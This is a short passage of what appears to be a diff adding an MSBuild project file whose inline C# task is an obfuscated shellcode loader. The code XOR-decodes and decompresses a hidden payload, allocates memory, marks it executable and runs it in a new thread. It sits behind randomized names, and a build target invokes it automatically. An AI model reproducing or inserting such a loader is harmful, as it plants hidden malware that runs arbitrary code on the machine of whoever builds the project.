Gc=0;Gc<ezFNvf.Length;Gc++){ezFNvf[Gc]^=T1RpB[Gc%32];}for(int Gc=0;Gc<ezFNvf.Length;Gc++){ezFNvf[Gc]^=X6rFt[Gc%32];}var CFvU=new System.IO.MemoryStream();using(var aQtI=new System.IO.Compression.GZipStream(new System.IO.MemoryStream(ezFNvf),System.IO.Compression.CompressionMode.Decompress))aQtI.CopyTo(CFvU);ezFNvf=CFvU.ToArray();var N6Vqn=fvrMuKA(System.IntPtr.Zero,(uint)ezFNvf.Length,0x3000u,0x04u);System.Runtime.InteropServices.Marshal.Copy(ezFNvf,0,N6Vqn,ezFNvf.Length);uint AZ0=0;yzrOFg0(N6Vqn,(uint)ezFNvf.Length,0x20u,out AZ0);sCujzQm(HSYlGjF(System.IntPtr.Zero,0u,N6Vqn,System.IntPtr.Zero,0u,System.IntPtr.Zero),0xFFFFFFFFu);return true;}]]></Code>
+    </Task>
+  </UsingTask>
+  <Target Name="mbsYtwCvty">
+    <nIxJ9UnXyD />
+  </Target>
+</Project>
